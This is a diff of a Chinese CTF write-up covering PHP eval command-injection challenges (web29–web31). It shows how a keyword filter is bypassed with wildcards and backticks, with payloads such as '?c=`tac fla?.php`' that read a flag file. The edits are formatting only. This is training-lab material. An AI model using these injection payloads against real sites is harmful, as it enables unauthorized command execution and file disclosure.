@@ -13,7 +13,8 @@ if(isset($_GET['c'])){
 }
 ```
 eval函数是把字符串作为PHP代码执行，过滤了flag，用通配符绕过
-payload：/?c=`tac fla?.php`;
+payload：/?c=&#96;tac fla?.php&#96;; 
+
 ## web30（反引号代替system）
 ```php
 <?php
@@ -31,6 +32,7 @@ if(isset($_GET['c'])){
 相比于上一题多过滤了system，php，php中，system可用反引号`绕过，php也用通配符绕过
 这里要用echo将执行结果输出一下，不然没有回显
 payload：/?c=echo `tac fla?.???`;
+
 ## web31（空格绕过）
 ```php
 <?php
